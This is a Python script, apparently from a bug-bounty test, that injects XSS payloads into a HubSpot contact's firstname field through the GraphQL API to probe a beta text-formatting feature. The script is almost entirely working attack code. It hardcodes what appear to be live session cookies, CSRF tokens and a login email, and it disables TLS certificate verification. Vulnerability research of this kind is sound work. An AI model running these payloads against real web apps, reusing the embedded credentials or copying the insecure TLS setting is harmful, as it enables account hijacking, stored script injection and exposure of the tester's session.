#!/usr/bin/env python3
"""
HubSpot Beta Feature XSS Test - Fixed Version
==============================================

Tests the "Remove Whitespace and Format Casing in Text Properties" beta feature
for XSS encoding bypasses by updating a contact's firstname property with payloads.

Author: Chavvo DA
Date: 2025-10-18
"""

import urllib.request
import urllib.error
import json
import ssl
import time
from datetime import datetime

# ============================================================================
# CONFIGURATION
# ============================================================================

HUBLET = "na2"
YOUR_PORTAL_ID = "242862774"

# CSRF Token (from X-HubSpot-CSRF-hubspotapi header)
CSRF_TOKEN = "AAccUftqXIglabnMcD-9ShAerUMvSBDgbbSN4okdhnFFJzdSOen4p1Ylb05yqCm1jzCTa67Sd-4Z14syasWz3s0oVkqC48IdIQ"

# Full cookie header
COOKIE_HEADER = "__hs_cookie_cat_pref=1:true_2:true_3:true; hubspotutk=61540ed14959970838d32bf890933b17; FPID=FPID2.2.aoifmDM9VHjP%2B0DNcWTT94YC%2FEDGX%2BQUKaCl%2Fjdgdtg%3D.1750377867; csrf.app=AAccUftqXIglabnMcD-9ShAerUMvSBDgbbSN4okdhnFFJzdSOen4p1Ylb05yqCm1jzCTa67Sd-4Z14syasWz3s0oVkqC48IdIQ; hubspotapi-prefs=0; hs_c2l=GM2U_VYiGQAQstEnImf9GGYYEuXCtIZHai-lwv2vJf8; hs_login_email=buttercup_ck@bugcrowdninja.com; laboratory-anonymous-id=anon3a47f7fc8dce04269224c103f75d; __cf_bm=7dKH9qDJDePvToxZAQU2SiY9i3jf2hve9xuuilwLi8I-1760826732-1.0.1.1-vda.Eac5sCDeWfipJ.KXp8IBAFzrsMW6IcJ7796LRiMWTHoqND0jb2sJSesiIl1mYiJOPSfZQbxGhdPo27YfS_duaGQm.vL8Hza_AAUBGWY; _cfuvid=P4L2XIuM4PEgjpdNcPGFVoP.Gx2I5WQ0OYD_UVZt5Ak-1760824013150-0.0.1.1-604800000; _conv_v=vi%3A1*sc%3A1*cs%3A1760824014*fs%3A1760824014*pv%3A1*exp%3A%7B100330256.%7Bv.1003131869-g.%7B%7D%7D-100347543.%7Bv.1003176559-g.%7B%7D%7D%7D*seg%3A%7B10031564.1-10034364.1-10034366.1%7D; __hstc=20629287.61540ed14959970838d32bf890933b17.1760824016750.1760824016750.1760824016750.1; __hssrc=1; _gcl_au=1.1.36100814.1760824017; hubspotapi-strict=AAccUfv7-gRXdDwtspRytheRo1Dvt8v7fuKZuRDsHaeXEWjZPFkEJDuMrjhEBZcUuBau3tV8DYImQGx1CV9dT4yyki7Alsho1Q; hs_login_metadata=%7B%22ungatedForLoginV4%22%3Afalse%2C%22showABTestVariant%22%3Afalse%2C%22isMobileLogin%22%3Afalse%7D; NPS_e579c260_last_seen=1760824080763; hubspotapi=AAccUfvVqwV8ckfVjAgXHHypyMDdw0i0LwSis7xqtiu5I0mJuSd4nxO8uq0nENoWGgcoyJCBwGg5VQYZwWefh3MCx_4Bgw2A21ungsVaRLcEyaQgHbaZjBoQEcmJYJAuKpk-P5iRa8fm92QGJHx5ZBh8fvOUTZuP5VBXA5dCtO4sfrv3c5awVXPi5SRHYelLVgC0sIwo0p8Mt9XS2YZeAqwE1wx-dIoSzymZG0IMWW2NY2V76HiyHg6D_57S5hJOBYjzZfMNueH9qHf4HRv2NunFoskMHvnDLLip300xpVnF3-PMQ4jZCtV1YB1oGKoNhoMPUgoBg2J4wqynDjCXdxh-X2Lx9U3YWoLfSl12cktnEOWstGIvx-HvgInq2qJ9kCUtkKzZPMXAhTUF8ZeRO_vnKeHbNKZrTDWdO0MEKaleWNmcj4S71XdH6w1EbAJbDf94NET2-83k6FGyQqTcjR3o5Awvu61SlazIbrDCQj-q1guN6DrspqOq4AAQGKyJ1fAlJ8F2uXxWqlAhDMZYumCvvhSBwbCx51yi6sAid3DClmbJUs7iCCwzmj77X2SZ1_4NEmXji2DqUOJPSRcpH6gH3TxRitvR77-tE8p-4lofLsROfThy_nahXzYUPi05qwwRoonjrUgIg4uApDaFYCcQ3goN_TD59IKi2ziR1iZG2C5ukLtvewLzVsxAAnOkS60NEd_f3TRCLcHGcvL2KNh9d_diw-h4zlm7jFsWTH2gk40axNoXeIR9EpwaAciVTxRCqgwW52Gv4tRcrvnSEjLQ32fE3BdNxVSO5gXzEFeY6MYHopBWNJrcvOPKpgPOh3QwTF_LRWFl8pIwaQuRvz1CwCii2N4TZVBhps8wStuhhts_rB1WvZJZzAKaX7q6zanvbAMpR4ocOQy2sVuY-vDD2O8qmGRjlgkcTEyk4b1YCPHWqo9h2RPUKmuOTGUC3VvTpcNQ8HJFsH3r5Kboy1SMNZlkhu50JJ4bE2kYH2S6jg5Z8-c8YT_zT26tD7RLABQtm0yRm6u7pRbnrQopL9YTTh3T_Q5g2hcVNWJJ_7TrpgCPUBorRx34_UgEB8mM9sVy59PwI1s-_y6xs0SD8HnvBtQFa_9A2nuHeebTNkO8vuOTdoATs_cbaD-4sM90zYFr6w-E8vhzJoawsK00Vb7JvJbnvNRrdPI31KQz_Rk6Sk6ch7z1Ub7qAzwudLmVYKQ1MBi1Z-jqS7eKjsIrfXvj51PvnYKvA90_H0Ix1IA_vBKbmTJImOIea1Kx1rX7D5li0hFMs3wPat-JuvFya-lmclMFSRERg8D9lZD3Ss4oH-fsq5EiT5umZhYssM5nGl-Ej7fgKbF52pY6TR87wu-vZBgh-TmM64IaDqdN9368YBE-HO2R33vhlzZQggf4IgkVP1bUJBRXRJGn0KfU0BMm-ZfNNyJXWfTasKNyj-SqdDvdTa4n-ZU; hubspotapi-csrf=AAccUftqXIglabnMcD-9ShAerUMvSBDgbbSN4okdhnFFJzdSOen4p1Ylb05yqCm1jzCTa67Sd-4Z14syasWz3s0oVkqC48IdIQ"

REQUEST_DELAY = 2  # Reduced for faster testing

# ============================================================================
# XSS PAYLOADS
# ============================================================================

XSS_PAYLOADS = {
    "WHITESPACE_TAB": {
        "payload": '<img\tsrc=x\tonerror=alert(document.domain)>',
        "description": "Tab characters - tests if whitespace removal creates valid XSS",
    },
    "CASE_MIXED": {
        "payload": '<ScRiPt>alert(document.domain)</ScRiPt>',
        "description": "Mixed case - tests if case formatting normalizes to executable",
    },
}

# ============================================================================
# GRAPHQL QUERIES
# ============================================================================

# Step 1: Search for existing contacts
SEARCH_CONTACTS = """
query SearchContacts {
  crmObjectsSearch(
    type: "0-1"
    filterGroups: []
    count: 1
    offset: 0
  ) {
    total
    results {
      id
    }
  }
}
"""

# Step 2: Update contact (based on Track A report structure)
UPDATE_CONTACT = """
mutation UpdateContact($contactId: String!, $portalId: String!, $firstName: String!) {
  updateContact(
    input: {
      id: $contactId
      portalId: $portalId
      properties: {
        firstname: $firstName
      }
    }
  ) {
    id
    properties(names: ["firstname"]) {
      name
      value
    }
  }
}
"""

# ============================================================================
# HTTP HELPERS
# ============================================================================

def execute_graphql(query, variables=None, operation_name=None):
    """Execute GraphQL query in HubSpot's required array format."""
    params = {
        'portalId': YOUR_PORTAL_ID,
        'clienttimeout': '14000',
        'hs_static_app': 'crm-index-ui',
        'hs_static_app_version': '2.49724'
    }
    query_string = '&'.join([f'{k}={v}' for k, v in params.items()])
    url = f'https://app-{HUBLET}.hubspot.com/api/graphql/crm?{query_string}'

    # HubSpot expects array of operations
    payload = {"query": query}
    if variables:
        payload["variables"] = variables
    if operation_name:
        payload["operationName"] = operation_name

    body = json.dumps([payload])

    req = urllib.request.Request(url, method='POST')
    req.add_header('Content-Type', 'application/json')
    req.add_header('Cookie', COOKIE_HEADER)
    req.add_header('X-HubSpot-CSRF-hubspotapi', CSRF_TOKEN)
    req.add_header('User-Agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0')
    req.add_header('Accept', 'application/json, text/javascript, */*; q=0.01')
    req.add_header('Origin', f'https://app-{HUBLET}.hubspot.com')
    req.add_header('Referer', f'https://app-{HUBLET}.hubspot.com/contacts/{YOUR_PORTAL_ID}/objects/0-1/views/all/list')

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    try:
        response = urllib.request.urlopen(req, body.encode('utf-8'), context=ctx)
        response_data = response.read().decode('utf-8')
        data = json.loads(response_data)

        return {
            'status': response.status,
            'success': True,
            'data': data,
            'error': None
        }

    except urllib.error.HTTPError as e:
        error_body = e.read().decode('utf-8', errors='ignore')
        try:
            error_data = json.loads(error_body)
        except:
            error_data = error_body

        return {
            'status': e.code,
            'success': False,
            'data': error_data,
            'error': f"HTTP {e.code}: {e.reason}"
        }

    except Exception as e:
        return {
            'status': 0,
            'success': False,
            'data': None,
            'error': str(e)
        }

# ============================================================================
# MAIN TEST
# ============================================================================

def main():
    print("=" * 80)
    print("HubSpot Beta XSS Test - updateContact Mutation")
    print("=" * 80)
    print(f"\nPortal ID: {YOUR_PORTAL_ID}")
    print(f"Hublet: {HUBLET}")
    print(f"Payloads: {len(XSS_PAYLOADS)}\n")

    # Step 1: Find a contact to update
    print("[1/3] Searching for existing contact...")
    result = execute_graphql(SEARCH_CONTACTS, operation_name="SearchContacts")

    if not result['success']:
        print(f"❌ Search failed: {result['error']}")
        return 1

    # Parse response (array format)
    data = result['data']
    if not isinstance(data, list) or len(data) == 0:
        print(f"❌ Unexpected response format")
        print(f"DEBUG: {json.dumps(data, indent=2)[:500]}")
        return 1

    response = data[0]
    if 'errors' in response and response['errors']:
        print(f"❌ GraphQL errors: {response['errors']}")
        return 1

    search_results = response.get('data', {}).get('crmObjectsSearch', {}).get('results', [])
    if not search_results:
        print("❌ No contacts found. Create a contact in HubSpot first.")
        return 1

    contact_id = search_results[0]['id']
    print(f"✅ Found contact ID: {contact_id}")

    # Step 2: Test each XSS payload
    print(f"\n[2/3] Testing {len(XSS_PAYLOADS)} XSS payloads...\n")

    for i, (test_id, test_data) in enumerate(XSS_PAYLOADS.items(), 1):
        payload = test_data['payload']
        description = test_data['description']

        print(f"[{i}/{len(XSS_PAYLOADS)}] {test_id}")
        print(f"Payload: {payload}")
        print(f"Description: {description}")

        # Update contact with XSS payload
        variables = {
            "contactId": contact_id,
            "portalId": YOUR_PORTAL_ID,
            "firstName": payload
        }

        result = execute_graphql(UPDATE_CONTACT, variables, "UpdateContact")

        if result['success']:
            data = result['data']
            if isinstance(data, list) and len(data) > 0:
                response = data[0]
                if 'errors' in response and response['errors']:
                    print(f"❌ GraphQL Error: {response['errors'][0]['message']}\n")
                elif 'data' in response and response['data']:
                    updated_value = response['data'].get('updateContact', {}).get('properties', [{}])[0].get('value', '')
                    print(f"✅ Updated! Value: {updated_value[:60]}...\n")
                else:
                    print(f"⚠️  Unknown response structure\n")
        else:
            print(f"❌ Update failed: {result['error']}\n")

        if i < len(XSS_PAYLOADS):
            time.sleep(REQUEST_DELAY)

    # Step 3: Summary
    print("[3/3] Test Complete")
    print(f"\nContact URL: https://app-{HUBLET}.hubspot.com/contacts/{YOUR_PORTAL_ID}/record/0-1/{contact_id}")
    print("\nManually check the contact's firstname field in HubSpot UI to verify XSS execution.")

if __name__ == '__main__':
    main()
